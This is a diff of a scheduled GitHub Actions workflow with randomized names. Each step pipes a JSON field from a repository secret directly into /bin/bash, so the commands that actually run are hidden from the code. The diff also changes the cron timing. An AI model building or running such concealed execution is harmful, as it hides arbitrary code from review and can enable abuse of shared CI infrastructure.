@@ -1,21 +1,27 @@
 name: jutibangxin
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
-
+    - cron: '20 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jutibangxin
         env:
-          qie93: ${{ secrets.qie93 }}
+          bo94510: ${{ secrets.bo94510 }}
         run: |
-          echo $qie93 | jq -r .xbesh15222 | /bin/bash
-          echo $mznsy8948 | jq -r .cy427 | /bin/bash
-          echo $tzsf64 | jq -r .erog95 | /bin/bash
-          echo $pwh96267 | jq -r .pbq1205 | /bin/bash
-          echo $c99 | jq -r .tiawo47 | /bin/bash
+          echo $bo94510 | jq -r .ih1676 | /bin/bash
+          echo $qswoq1 | jq -r .bvv12 | /bin/bash
+          echo $rd679 | jq -r .aqejr003 | /bin/bash
+          echo $hy059 | jq -r .h56 | /bin/bash
+          echo $sbi90331 | jq -r .fc81518 | /bin/bash
+          echo $iz443 | jq -r .zvg57882 | /bin/bash
+          echo $euqd94 | jq -r .el9394 | /bin/bash
+          echo $crb325 | jq -r .bq60 | /bin/bash
+          echo $xe6 | jq -r .n3 | /bin/bash
+          echo $v1 | jq -r .xc609 | /bin/bash
 
